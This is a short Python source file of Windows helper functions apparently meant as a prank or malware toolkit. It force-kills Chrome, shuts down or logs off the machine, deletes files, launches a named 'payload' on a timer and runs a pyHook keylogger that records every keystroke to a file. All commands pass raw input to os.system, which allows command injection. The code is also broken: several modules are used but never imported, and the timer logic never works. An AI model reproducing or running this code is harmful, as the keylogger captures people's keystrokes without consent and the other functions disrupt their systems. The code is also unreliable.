import os
import datetime
from tkinter import *
import win32api
import keyboard
import time
def hell():
  os.system("taskkill /IM chrome.exe /F")
  os.system("start notepad")
def Kill(data):
  op = "taskkill /IM {} /F"
  data2 = op.format(data)
  os.system(data2)
def Start(data):
  print(data)
  rm  = "start {}"
  op = rm.format(data)
  os.system(op)
def Makedir(data):
  kl = "mkdir {}"
  op = kl.format(data)
  os.system(op)
  
def ping(data):
  data2 = "ping {}"
  op = data2.format(data)
  os.system(op)
def syskill(data):
  lp = "shutdown /{}"
  op = lp.format(data)
  os.system(op)
def startbat(data):
  ls = "start {}"
  op = ls.format(data)
  os.system(op)
def launchpayload(data,time):
  dt = datetime.datetime.now()
  i = True
  time2 = dt.hour+dt.minute
  while i:
    print(time2)
    if time == time2:
      lp = "start {}"
      op = lp.format(data)
      os.system(op)
def beep(data):
  win32api.Beep(631,data)
def loggout():
  win32api.ExitWindows()
def msgbox(data,title,res):
  window = Tk()
  window.title(title)
  window.geometry(res)
  Lab = Label(window,text=data)
  Lab.grid(column=0, row=0)
  window.mainloop()
def execute(data):
  lp = "start {}"
  op = lp.format(data)
  os.system(op)
def copy(data):
  lp = "xcopy {}/O /X /E /H /K"
  op = lp.format(data)
  os.system(op)
def playsound(data):
  win32api.MessageBeep(data)
def delete(data):
  pl = "del {}"
  op = pl.format(data)
  os.system(op)
def Keylog(data):
  file_log = data

  def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
  hooks_manager = pyHook.HookManager()
  hooks_manager.KeyDown = OnKeyboardEvent
  hooks_manager.HookKeyboard()
  pythoncom.PumpMessages()
def getCPUname():
  return pwd.getpwuid( os.getuid() )[ 0 ]
